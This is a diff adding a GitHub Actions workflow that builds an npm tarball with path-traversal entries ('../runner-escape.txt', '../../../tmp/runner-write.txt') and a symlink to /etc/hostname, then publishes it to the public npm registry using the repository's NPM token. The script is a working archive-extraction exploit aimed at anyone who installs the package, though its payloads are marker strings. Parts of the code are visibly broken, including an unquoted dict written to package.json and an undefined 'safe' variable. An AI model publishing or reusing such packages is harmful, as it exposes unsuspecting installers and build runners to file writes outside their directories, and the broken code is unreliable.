@@ -1,0 +1,55 @@
+name: NPM Traversal Publish
+on: [workflow_dispatch]
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Set up Node
+        uses: actions/setup-node@v4
+        with:
+          registry-url: https://registry.npmjs.org/
+      
+      - name: Get OTP from email
+        run: |
+          echo "Need NPM_OTP secret set"
+      
+      - name: Create and publish traversal tarball
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+        run: |
+          python3 << "PYEOF"
+import tarfile, io, time, os
+
+os.makedirs("pkg", exist_ok=True)
+with open("pkg/package.json", "w") as f:
+    f.write({name:apex-black-runner-publish,version:1.0.0,description:runner test})
+with open("pkg/index.js", "w") as f:
+    f.write(safe)
+
+os.chdir("pkg")
+tgz = "package.tgz"
+with tarfile.open(tgz, "w:gz") as tar:
+    for fname in ["package.json", "index.js"]:
+        info = tarfile.TarInfo(f"package/{fname}")
+        info.size = os.path.getsize(fname)
+        with open(fname, "rb") as f:
+            tar.addfile(info, f)
+    # Traversal entries
+    for name, content in [
+        ("../runner-escape.txt", b"RUNNER_TRAVERSAL_ESCAPE"),
+        ("../../../tmp/runner-write.txt", b"RUNNER_FILE_WRITE"),
+        ("package/etc-hostname-link", "/etc/hostname"),
+    ]:
+        if isinstance(content, bytes):
+            info = tarfile.TarInfo(name)
+            info.size = len(content)
+            tar.addfile(info, io.BytesIO(content))
+        else:
+            info = tarfile.TarInfo(name)
+            info.type = tarfile.SYMTYPE
+            info.linkname = content
+            tar.addfile(info)
+
+import subprocess
+subprocess.run(["npm", "publish", tgz], check=False)
+PYEOF
